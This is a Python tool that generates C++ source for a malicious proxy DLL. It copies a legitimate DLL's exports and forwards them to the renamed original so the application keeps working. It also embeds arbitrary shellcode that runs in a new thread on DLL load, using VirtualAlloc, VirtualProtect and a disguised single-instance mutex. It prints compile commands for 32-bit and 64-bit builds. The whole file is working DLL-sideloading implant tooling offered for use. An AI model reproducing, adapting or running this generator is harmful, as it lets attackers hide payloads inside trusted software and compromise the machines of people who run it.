import pefile
import os
import textwrap
import argparse

def generate_proxy(original_dll, shellcode_file, proxy_target=None, output_file="dllmain.cpp", mutex_name=None):
    if not os.path.exists(shellcode_file):
        print(f"[-] Error: {shellcode_file} not found.")
        return
    if not os.path.exists(original_dll):
        print(f"[-] Error: {original_dll} not found.")
        return

    # Derive proxy_target from the original DLL filename if not specified
    # e.g. "abc_orig.dll" or "abc.dll" -> "abc_orig"
    if proxy_target is None:
        base = os.path.splitext(os.path.basename(original_dll))[0]  # strip .dll
        if not base.endswith("_orig"):
            proxy_target = base + "_orig"
        else:
            proxy_target = base
        print(f"[*] proxy_target not specified, using: {proxy_target}")

    # Derive mutex name from proxy_target if not specified
    if mutex_name is None:
        # e.g. abc_orig -> AbcWorker
        friendly = proxy_target.replace("_orig", "").replace("_", "").capitalize()
        mutex_name = f"Global\\{friendly}Worker"
    print(f"[*] Mutex name: {mutex_name}")

    with open(shellcode_file, 'rb') as f:
        raw_data = f.read()

    payload_hex = "".join([f"\\x{b:02x}" for b in raw_data])

    try:
        pe = pefile.PE(original_dll)
    except Exception as e:
        print(f"[-] Error loading {original_dll}: {e}")
        return

    if not hasattr(pe, 'DIRECTORY_ENTRY_EXPORT'):
        print(f"[-] Error: {original_dll} has no export table.")
        return

    cpp = [
        '#include <windows.h>',
        '#include <shlwapi.h>',
        '#pragma comment(lib, "shlwapi.lib")',
        '',
        '// --- PROXY FORWARDERS ---',
    ]

    no_ordinal_exports = ['DllCanUnloadNow', 'DllGetClassObject', 'DllGetVersion', 'DllInstall']

    for export in pe.DIRECTORY_ENTRY_EXPORT.symbols:
        ordinal = export.ordinal
        if export.name:
            name = export.name.decode('utf-8')
            if name in no_ordinal_exports:
                cpp.append(f'#pragma comment(linker, "/export:{name}={proxy_target}.{name},PRIVATE")')
            else:
                cpp.append(f'#pragma comment(linker, "/export:{name}={proxy_target}.{name},@{ordinal}")')
        else:
            cpp.append(f'#pragma comment(linker, "/export:ord{ordinal}={proxy_target}.#{ordinal},@{ordinal},NONAME")')

    cpp.extend(['', 'unsigned char shellcode[] = '])

    chunks = textwrap.wrap(payload_hex, 100)
    for i, chunk in enumerate(chunks):
        if i < len(chunks) - 1:
            cpp.append(f'    "{chunk}"')
        else:
            cpp.append(f'    "{chunk}";')

    # Escape backslash in mutex name for C string literal
    mutex_c = mutex_name.replace("\\", "\\\\")

    cpp.extend([
        '',
        'DWORD WINAPI Work(LPVOID lpParam) {',
        f'    HANDLE hMutex = CreateMutexA(NULL, TRUE, "{mutex_c}");',
        '    if (GetLastError() == ERROR_ALREADY_EXISTS) {',
        '        CloseHandle(hMutex);',
        '        return 0;',
        '    }',
        '',
        '    size_t len = sizeof(shellcode);',
        '    LPVOID mem = VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);',
        '    if (mem) {',
        '        RtlMoveMemory(mem, shellcode, len);',
        '        DWORD old;',
        '        if (VirtualProtect(mem, len, PAGE_EXECUTE_READ, &old)) {',
        '            ((void(*)())mem)();',
        '        }',
        '    }',
        '    return 0;',
        '}',
        '',
        'BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {',
        '    if (reason == DLL_PROCESS_ATTACH) {',
        '        DisableThreadLibraryCalls(hModule);',
        '',
        '        if (GetModuleHandleA("' + proxy_target + '.dll") == NULL) {',
        '            if (LoadLibraryA("' + proxy_target + '.dll") == NULL) {',
        '                return FALSE;',
        '            }',
        '        }',
        '',
        '        HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Work, NULL, 0, NULL);',
        '        if (hThread) CloseHandle(hThread);',
        '    }',
        '    return TRUE;',
        '}'
    ])

    with open(output_file, "w") as f:
        f.write("\n".join(cpp))

    export_count = len(pe.DIRECTORY_ENTRY_EXPORT.symbols)
    print(f"[+] Success! Generated {output_file}")
    print(f"    Shellcode : {len(raw_data)} bytes")
    print(f"    Exports   : {export_count} forwarded")
    print(f"    Target    : {proxy_target}.dll")
    print(f"[*] For 32-bit, compile in x86 console with:")
    dll_name = os.path.splitext(os.path.basename(original_dll))[0].replace("_orig", "")
    print(f"    cl.exe /MT /arch:IA32 /LD {output_file} /Fe:{dll_name}.dll User32.lib /link /MACHINE:X86 /SUBSYSTEM:WINDOWS,5.01")
    print(f"[*] For 64-bit, compile in x64 console with:")
    print(f"    cl.exe /MT /LD {output_file} /Fe:{dll_name} User32.lib /link /MACHINE:X64 /SUBSYSTEM:WINDOWS")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Generate a proxy DLL with embedded shellcode.",
        epilog="Example: python masterproxy.py abc_orig.dll shellcode.bin"
    )
    parser.add_argument("original_dll",   help="Path to the renamed original DLL (e.g. abc_orig.dll)")
    parser.add_argument("shellcode_file", help="Path to the raw shellcode binary (e.g. shellcode.bin)")
    parser.add_argument("--proxy-target", help="Override the proxy target name (default: derived from original_dll)")
    parser.add_argument("--output",       help="Output .cpp filename (default: dllmain.cpp)", default="dllmain.cpp")
    parser.add_argument("--mutex",        help="Override the Global mutex name (default: derived from proxy target)")
    args = parser.parse_args()

    generate_proxy(
        original_dll=args.original_dll,
        shellcode_file=args.shellcode_file,
        proxy_target=args.proxy_target,
        output_file=args.output,
        mutex_name=args.mutex
    )